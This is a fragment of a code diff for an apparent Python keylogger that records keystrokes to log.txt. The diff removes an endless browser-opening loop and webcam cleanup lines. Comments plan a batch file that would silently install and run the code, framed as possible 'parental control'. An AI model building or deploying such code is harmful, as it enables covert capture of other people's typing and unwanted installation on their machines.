@@ -32,15 +32,6 @@ def on_press(key):
 
 
 
-    #browser repeat open
-
-    if i>=10000000000:              #change the number here for it to activate after <your number> of alphabets.
-
-        while True:
-
-            webbrowser.open("https://www.youtube.com/")
-
-        i=0
 
 def write_file(keys):
     with open("log.txt","a") as f:
@@ -72,8 +63,6 @@ with Listener(on_press=on_press, on_release=on_release)as listener:
 
 
 #make a batch file that installs git(how tf....?) and pulls the code and runs it(run u need to figure out.)
-vid.release()
-cv2.destroyAllWindows()
 #ethical:add a pw for this so that it can work as a parental control thing.
 
 
